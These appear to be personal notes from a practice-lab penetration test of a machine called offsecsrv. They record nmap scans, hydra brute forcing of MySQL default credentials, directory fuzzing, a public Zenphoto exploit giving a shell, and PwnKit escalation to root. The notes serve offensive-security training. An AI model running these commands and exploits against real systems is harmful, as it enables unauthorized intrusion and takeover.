### Enumeration
```
IP=192.168.170.41
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,23,80,3306 -A $IP
```
### Ports
- 22
	- OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
- 23
	- ipp     CUPS 1.4
- 80
	- Apache httpd 2.2.14 ((Ubuntu))
- 3306
	- mysql
### Foothold
- 3306
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP`
- 80
	- Default landing page
		- ![[Pasted image 20240711133636.png]]
	- Versions
		- zenphoto version 1.4.1.4
			- googled zenphoto version 1.4.1.4
				- exploit-db 18083
				- php 18083.php $IP /test/
				- now we have a shell
				- ![[Pasted image 20240711140121.png]]
				- busybox rev to get RCE
		- /test
			- Zenphoto
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
			- /test
				- ![[Pasted image 20240711133756.png]]
				- Search parameter
					- http://192.168.170.41/test/index.php?p=search
			- /test/cache
				- nothing
			- /test/albums/
				- nothing
			- /test/plugins
				- a few
			- /test/themes/
				- a few
			- test/zp-core/
				- ![[Pasted image 20240711135007.png]]
			- test/zp-data/
				- ![[Pasted image 20240711135050.png]]
				- .txt files are 404 forbidden
			- /test/page/search/
				- not found
			- /test/robots.txt
				- ![[Pasted image 20240711134908.png]]
			- /test/uploaded
				- empty
- 23
	- ![[Pasted image 20240711134642.png]]
	- Directory Brute force
		- dirsearch -u http://$IP:23
### PE
#### Linux
- www-data
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- requires password
	- uname -a
		- `Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux`
	- getcap -r / 2>/dev/null
		- none
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
		- nothing
	- Users with console
		- root
	- linpeas
		- possible exploits
			- pwnkit
				- bash: ./PwnKit: cannot execute binary file
				- ./PwnKit32 syntax error
					- Gives us root
### Credentials
### Lessons Learned
- Try exploits that you find
- php files can be executed in bash with php file.php